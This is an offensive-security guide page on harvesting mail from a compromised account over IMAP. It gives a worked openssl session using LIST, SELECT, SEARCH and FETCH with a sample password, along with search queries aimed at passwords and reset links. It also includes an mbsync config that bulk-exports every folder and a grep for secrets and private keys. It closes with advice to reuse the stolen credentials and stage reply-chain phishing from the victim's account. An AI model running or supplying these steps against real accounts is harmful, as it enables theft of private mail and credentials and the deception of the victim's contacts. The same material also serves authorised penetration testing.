---
title: "Mailbox access: reading and looting mail over IMAP"
description: "Driving an authenticated IMAP session for loot: LIST to map folders, SELECT a mailbox, SEARCH for credential-bearing mail, and FETCH headers and full bodies. Dumps mail in a worked session, greps for secrets, and bulk-exports every folder with mbsync, offlineimap, or himalaya."
keywords:
  - imap fetch
  - imap search
  - mail harvesting
  - mbsync
  - reply-chain phishing
---

# Mailbox access

A valid credential turns IMAP into a searchable copy of everything the account has ever filed. The protocol is built for exactly the operations you want: `LIST` maps the folders, `SELECT` opens one, `SEARCH` finds messages by content or header, and `FETCH` pulls headers or whole bodies. Mailboxes are one of the richest loot sources in a network: plaintext credentials, password-reset and MFA-enrollment links, VPN and wifi setup mail, internal documents as attachments, and complete reply chains that make later phishing indistinguishable from real correspondence.

## Preconditions

An authenticated session ([authentication](authentication.md)). Keep the session on 993 or STARTTLS so the mail you pull is not mirrored to anyone on-path.

## Worked session

```bash
openssl s_client -connect <target>:993 -quiet
a LOGIN alice 'Sprint2025!'
a OK Logged in
a LIST "" "*"
* LIST (\HasNoChildren) "/" INBOX
* LIST (\HasNoChildren) "/" Sent
* LIST (\HasNoChildren) "/" "Archive/2024"
a OK List completed
a SELECT INBOX
* 1240 EXISTS
a OK [READ-WRITE] Select completed
a SEARCH OR OR SUBJECT "password" BODY "password" BODY "credential"
* SEARCH 14 221 889 1203
a OK Search completed
a FETCH 1203 (BODY[HEADER.FIELDS (FROM SUBJECT DATE)])
* 1203 FETCH (BODY[HEADER.FIELDS (FROM SUBJECT DATE)] {84}
From: it-helpdesk@corp.local
Subject: Your temporary VPN password
Date: Mon, 22 Sep 2025 09:11:04 +0000
)
a FETCH 1203 (BODY[TEXT])
```

Read the numbers: `SELECT` reports `EXISTS` (message count) so you know the range for `1:*`. `SEARCH` returns a space-separated list of sequence numbers matching the criteria; feed those straight into `FETCH`. `BODY[HEADER.FIELDS (...)]` pulls just the chosen headers (cheap triage across thousands of messages), and `BODY[TEXT]` or `BODY[]` pulls the body or the entire RFC822 message including attachments. The `{84}` is a literal-length prefix telling you how many bytes of literal follow.

High-value `SEARCH` criteria:

```
a SEARCH BODY "password"
a SEARCH SUBJECT "reset"
a SEARCH BODY "https://"                 # reset / enrollment / SSO links
a SEARCH HEADER "Content-Type" "application/"   # messages carrying attachments
a SEARCH SINCE 1-Jan-2025 FROM "helpdesk"
```

## Bulk export and triage offline

Pulling message-by-message is fine for targeted hunts; for a full account, mirror every folder to disk once and grep locally.

```bash
# mbsync (isync): one pull of all folders into a Maildir
cat > ~/.mbsyncrc <<'EOF'
IMAPAccount loot
Host <target>
Port 993
User alice
Pass Sprint2025!
TLSType IMAPS
CertificateFile /etc/ssl/certs/ca-certificates.crt
IMAPStore loot-remote
Account loot
MaildirStore loot-local
Path ~/loot/alice/
Inbox ~/loot/alice/INBOX
Channel loot
Far :loot-remote:
Near :loot-local:
Patterns *
EOF
mbsync loot

# then mine the Maildir
grep -rniE 'password|passwd|secret|api[_-]?key|BEGIN (RSA|OPENSSH) PRIVATE KEY' ~/loot/alice/ | head
```

`offlineimap -o` does the same one-shot full sync, and `himalaya` (a CLI IMAP client) is handy for ad-hoc interactive reads: `himalaya -u alice -p 993 ... list` then `read <id>`. Across folders, `Sent` and `Archive` usually out-loot `INBOX`, since sent mail contains the user's own outbound credentials and shared secrets.

## Follow-on

Mine recovered credentials and tokens for immediate reuse against other services. Use genuine reply chains pulled here to stage reply-chain phishing from the compromised account (write access via SMTP submission), and map internal relationships from `From`/`To`/`Cc` for the next pivot.

## Tools

- [isync / mbsync](https://isync.sourceforge.io/)
- [OfflineIMAP](https://www.offlineimap.org/)
- [himalaya](https://github.com/pimalaya/himalaya)

## References

- [RFC 3501: FETCH and SEARCH](https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.4)
- [HackTricks: pentesting IMAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html)
